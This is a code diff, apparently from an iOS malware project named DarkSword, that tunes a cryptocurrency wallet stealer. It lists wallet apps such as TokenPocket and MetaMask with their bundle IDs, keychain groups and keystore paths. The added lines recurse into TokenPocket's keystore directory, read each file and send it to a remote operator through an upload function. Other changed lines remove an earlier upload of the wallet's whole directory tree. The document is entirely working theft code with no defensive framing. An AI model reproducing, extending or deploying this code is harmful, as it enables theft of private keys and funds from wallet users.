@@ -390,7 +390,8 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
         // 整树抓取（Documents + AppSupport 递归）覆盖，无需单独列。
         @{@"type": @"tokenpocket", @"bundleId": @"com.global.wallet.ios",
           @"keychainGroup": @"PBVM2VS547.com.global.wallet.ios",
-          @"files": @[@"db/main.sqlite3", @"db/label.sqlite3"]},
+          @"files": @[@"db/main.sqlite3", @"db/label.sqlite3"],
+          @"dirs": @[@"Documents/F4SeCyr"]},
         @{@"type": @"metamask", @"bundleId": @"io.metamask",
           @"keychainGroup": @"48XVW22RCG.io.metamask",
           @"files": @[@"persistStore/persist-keyringcontroller",
@@ -485,44 +486,30 @@ static NSString *DSWalletScanOne(NSDictionary *wallet)
         }
     }
 
-    // Also grab the wallet's Documents + Application Support trees (bounded,
-    // skipping cache and oversized files) to catch dynamically-named keystore
-    // files we cannot hardcode (e.g. TokenPocket's Documents/F4SeCyr/<sha256>).
-    NSArray<NSString *> *grabDirs = @[
-        [container stringByAppendingPathComponent:@"Documents"],
-        [container stringByAppendingPathComponent:@"Library/Application Support"],
-    ];
-    NSMutableArray<NSDictionary *> *all = [NSMutableArray array];
-    for (NSString *dir in grabDirs) {
-        DSRecurseInto(dir, 4, all, 300);
-    }
-    for (NSDictionary *entry in all) {
-        if ([entry[@"dir"] boolValue]) continue;
-        NSString *path = entry[@"name"];
-        unsigned long long size = [entry[@"size"] unsignedLongLongValue];
-        if (size == 0 || size > 20 * 1024 * 1024) continue;
-        if ([path rangeOfString:@"/cache/" options:NSCaseInsensitiveSearch].location != NSNotFound) continue;
-        if ([path rangeOfString:@"/Caches/" options:NSCaseInsensitiveSearch].location != NSNotFound) continue;
-        NSData *data = DSReadFileBytes(path);
-        if (data.length == 0) continue;
-        DarkSwordUpload(@"wallet", path,
-                        [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID], data, nil);
-    }
-
-    // Always upload a bounded directory tree so the operator can see the
-    // wallet's actual on-disk layout — paths vary by app version and are not
-    // guaranteed, so this shows where the real files live.
-    NSMutableArray<NSDictionary *> *tree = [NSMutableArray array];
-    DSRecurseInto(container, 3, tree, 500);
-    NSData *treeJson = [NSJSONSerialization dataWithJSONObject:tree options:0 error:nil];
-    if (treeJson.length > 0) {
-        DarkSwordUpload(@"wallet", container,
-                        [NSString stringWithFormat:@"%@ container tree", wallet[@"type"]],
-                        treeJson, nil);
+    // Grab only the specifically-named directories (e.g. TokenPocket's
+    // Documents/F4SeCyr/<sha256>), not the whole Documents tree — that avoids
+    // uploading unrelated junk (Firebase/Google/crashlytics plists).
+    for (NSString *dir in wallet[@"dirs"]) {
+        NSString *dirPath = [container stringByAppendingPathComponent:dir];
+        NSMutableArray<NSDictionary *> *entries = [NSMutableArray array];
+        DSRecurseInto(dirPath, 3, entries, 64);
+        for (NSDictionary *entry in entries) {
+            if ([entry[@"dir"] boolValue]) continue;
+            NSString *path = entry[@"name"];
+            unsigned long long size = [entry[@"size"] unsignedLongLongValue];
+            if (size == 0 || size > 20 * 1024 * 1024) continue;
+            NSData *data = DSReadFileBytes(path);
+            if (data.length == 0) continue;
+            DarkSwordUpload(@"wallet", path,
+                            [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID], data, nil);
+            NSString *rel = path.length > container.length + 1
+                ? [path substringFromIndex:container.length + 1] : path;
+            [found addObject:[NSString stringWithFormat:@"%@ (%luB)", rel, (unsigned long)data.length]];
+        }
     }
 
     if (found.count == 0) {
-        return [NSString stringWithFormat:@"%@: container %@ but 0 target files matched (tree uploaded)",
+        return [NSString stringWithFormat:@"%@: container %@ but 0 target files matched",
                 wallet[@"type"], container.lastPathComponent];
     }
     return [NSString stringWithFormat:@"%@: %lu file(s) — %@",
